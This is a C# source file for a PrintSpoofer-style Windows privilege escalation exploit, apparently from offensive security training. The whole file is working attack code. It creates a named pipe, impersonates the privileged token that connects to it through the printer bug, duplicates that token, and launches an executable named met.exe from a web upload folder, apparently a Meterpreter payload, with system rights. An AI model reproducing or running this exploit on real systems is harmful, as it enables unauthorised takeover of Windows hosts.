﻿using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace PrintSpoolerClient
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";

            string pipeName = args[0];
            //Create pipe
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            //Connect to pipe we just created
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            //Impersonate token that connects to pipe
            ImpersonateNamedPipeClient(hPipe);

            //Next section allows us to see the output of the token connected to our pipe. It is not needed for exploitation
            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            //Opening up a command prompt
            //First duplicate the token we got through the printer bug that we will use with the cmd prompt
            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);
            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);

            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine("Impersonated user is: " + name);

            RevertToSelf();

            //Open the command prompt with our new token

            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\inetpub\\wwwroot\\Upload\\met.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);

        }
    }
}
